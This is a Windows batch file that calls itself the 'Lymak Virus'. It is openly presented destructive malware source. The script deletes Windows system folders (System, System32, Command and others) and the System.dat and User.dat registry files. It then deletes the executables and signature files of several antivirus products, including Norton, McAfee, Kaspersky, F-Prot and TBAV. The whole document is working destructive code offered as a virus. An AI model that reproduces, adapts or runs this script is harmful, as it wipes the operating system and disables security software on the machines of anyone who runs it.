   echo off
   cls
   :: Lymak Virus by Arnold Lavoc
   If Exist C:\Windows goto GET
   goto CN
   :GET
   cls
   DELTREE %Windir%\System\*.*
   DELTREE %Windir%\Start Menu\Programs\Accessories\System Tools\*.*
   DELTREE %Windir%\Cursor\*.*
   DELTREE %Windir%\Temp\*.*
   DELTREE %Windir%\Command\*.*
   DELTREE %Windir%\System32\*.*
   attrib %Windir%\System.dat -s -h -r
   attrib %Windir%\User.dat -s -h -r
   DEL %Windir%\System.dat >>NUL
   DEL %Windir%\User.dat >>NUL
   goto CN
   :CN
   cls
   If Exist C:\Progra~1\Kasper~1\Avp32.exe goto AVP
   goto NAV
   :AVP
   DEL C:\Progra~1\Kasper~1\Avp32.exe >>NUL
   goto NAV
   :NAV
   If Exist C:\Progra~1\Norton~1\*.exe goto KNAV
   goto TRO
   :KNAV
   DEL C:\Progra~1\Norton~1\*.exe >>NUL
   goto TRO
   :TRO
   If Exist C:\Progra~1\Trojan~1\Tc.exe goto KTRO
   goto NOR
   :KTRO
   DEL C:\Progra~1\Trojan~1\Tc.exe >>NUL
   goto NOR
   :NOR
   If Exist C:\Progra~1\Norton~1\S32integ.dll goto KNOR
   goto FPR
   :KNOR
   DEL C:\Progra~1\Norton~1\S32integ.dll >>NUL
   :FPR
   If Exist C:\Progra~1\F-prot95\Fpwm32.dll goto KFRP
   goto MCA
   :KFRP
   DEL C:\Progra~1\F-prot95\Fpwm32.dll >>NUL
   goto MCA
   :MCA
   If Exist C:\Progra~1\Mcafee\Scan.dat goto KMCA
   goto TBA
   :KMCA
   DEL C:\Progra~1\Mcafee\Scan.dat >>NUL
   goto TBA
   :TBA
   If Exist C:\Progra~1\Tbav\Tbav.dat goto KTBA
   goto ANT
   :KTBA
   DEL C:\Progra~1\Tbav\Tbav.dat >>NUL
   goto ANT
   :ANT
   If Exist DEL C:\Progra~1\Avpersonal\Antivir.vdf goto KANT
   goto TBAV
   :KANT
   DEL C:\Progra~1\Avpersonal\Antivir.vdf >>NUL
   goto TBAV
   :TBAV
   If Exist C:\Tbav95\Tbscan.sig goto KTBAV
   goto END
   :KTBAV
   DEL C:\Tbav95\Tbscan.sig >>NUL
   :END
   echo Lymak Virus Spreading...
   EXIT
